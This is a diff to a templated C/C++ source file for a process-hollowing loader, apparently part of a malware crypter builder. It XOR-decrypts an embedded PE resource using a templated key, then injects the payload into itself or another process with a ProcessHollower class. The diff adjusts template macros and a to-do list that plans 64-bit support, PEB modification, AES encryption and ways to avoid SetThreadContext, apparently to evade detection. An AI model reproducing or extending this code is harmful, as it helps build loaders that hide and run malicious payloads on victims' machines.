@@ -1,11 +1,11 @@
 #include "resource.h"
 #include "processHollower.h"
 
-#define TARGET_EXE_TYPE {{ cookiecutter.target_exe_type}}
+#define {{ cookiecutter.target_exe_type}}
 
 VOID DecryptPE(char *lpGuestPEData, DWORD dwResourceSize) {
     char key[] = "{{ cookiecutter.encryption_key }}";
-    int keyLength = strlen(key);
+    int keyLength = {{ cookiecutter.key_length }};
 
     for (int i = 0; i < dwResourceSize; i++) {
         lpGuestPEData[i] ^= key[i % keyLength];
@@ -24,7 +24,7 @@ int main() {
 
     ProcessHollower PHollower;
 
-#if TARGET_EXE_TYPE == 0
+#ifdef TARGET_TYPE_SELF
     char lpHostApplicationName[ MAX_PATH ];
     GetModuleFileName(nullptr, lpHostApplicationName, MAX_PATH+1);
 #else
@@ -47,7 +47,7 @@ int main() {
  * + 64 bits
  * + Debug messages
  * - Try allocation at injected PE BaseAddress (modify PEB), if it fails try as now
- * - Force GUI if target is GUI
+ * - Force GUI if target is GUI. Also check before compilation check if is GUI (otherwise, when bulid type is release do not compile as GUI)
  * - AES decryption
  * - Other methods: avoid SetThreadContext, etc.
  */
